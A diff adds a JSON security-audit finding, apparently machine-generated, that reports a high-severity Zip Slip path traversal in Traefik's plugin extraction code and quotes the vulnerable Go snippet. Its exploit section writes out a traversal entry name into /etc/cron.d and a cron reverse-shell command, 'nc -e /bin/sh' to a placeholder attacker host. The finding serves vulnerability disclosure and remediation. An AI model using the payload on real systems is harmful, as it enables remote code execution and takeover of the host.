@@ -1,0 +1,17 @@
+[
+  {
+    "finding_id": "1313c461-3e2f-575e-9ece-6040df9f828e",
+    "session_id": "ChA3NWJhMDY5ODFlOTRmMjA3EAgaATAqBG1haW4",
+    "title": "Arbitrary File Overwrite via Path Traversal (Zip Slip) in Plugin Archive Extraction",
+    "file_path": "/home/jfplante_google_com/repos/p16-traefik_rep1/pkg/plugins/client.go",
+    "severity": "HIGH",
+    "confidence": 100,
+    "analysis": "**Data Path Trace**:\n- **Source**: When Traefik starts up with remote plugins configured (via `SetupRemotePlugins`), it downloads plugin archive files from the plugin catalog (`client.Download`).\n- **Sanitization/Validation**: In `unzipFile` (`pkg/plugins/client.go`), the code splits the file path using `strings.SplitN(f.Name, \"/\", 2)` to extract `pp` from the second part (lines 281-288). However, it performs no path sanitization, canonicalization, or prefix boundary checks (e.g. `strings.HasPrefix(filepath.Clean(p), filepath.Clean(dest)+string(filepath.Separator))`).\n- **Sink**: The unvalidated path `p := filepath.Join(dest, pp)` is passed directly to `os.MkdirAll(filepath.Dir(p), 0o750)`, `os.OpenFile(p, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())`, and `io.Copy(elt, rc)` (lines 290-313), allowing an archive to write arbitrary files anywhere on the host filesystem with arbitrary file permissions.\n\n**Conceptual Exploit Payload**:\nAn attacker publishes or serves a malicious plugin zip archive containing an entry named:\n`root/../../../../../../etc/cron.d/malicious_job`\ncontaining:\n`* * * * * root /bin/sh -c \"nc -e /bin/sh attacker.com 4444\"\\n`\nwith mode `0644`.\nWhen `unzipFile` processes this archive entry:\n1. `strings.SplitN(\"root/../../../../../../etc/cron.d/malicious_job\", \"/\", 2)` yields `pp = \"../../../../../../etc/cron.d/malicious_job\"`.\n2. `filepath.Join(dest, pp)` resolves to `/etc/cron.d/malicious_job`.\n3. `os.OpenFile(\"/etc/cron.d/malicious_job\", ...)` opens the target file.\n4. `io.Copy` writes the cron job payload, resulting in arbitrary file write and remote code execution.",
+    "snippet": "\tp := filepath.Join(dest, pp)\n\n\tif f.FileInfo().IsDir() {\n\t\terr = os.MkdirAll(p, f.Mode())\n\t\tif err != nil {\n\t\t\treturn fmt.Errorf(\"unable to create archive directory %s: %w\", p, err)\n\t\t}\n\n\t\treturn nil\n\t}\n\n\terr = os.MkdirAll(filepath.Dir(p), 0o750)\n\tif err != nil {\n\t\treturn fmt.Errorf(\"unable to create archive directory %s for file %s: %w\", filepath.Dir(p), p, err)\n\t}\n\n\telt, err := os.OpenFile(p, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())\n\tif err != nil {\n\t\treturn err\n\t}\n\n\tdefer func() { _ = elt.Close() }()\n\n\t_, err = io.Copy(elt, rc)",
+    "vuln_type": "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
+    "vuln_id": "CWE-22",
+    "status": "OPEN",
+    "start_line": 290,
+    "end_line": 313
+  }
+]
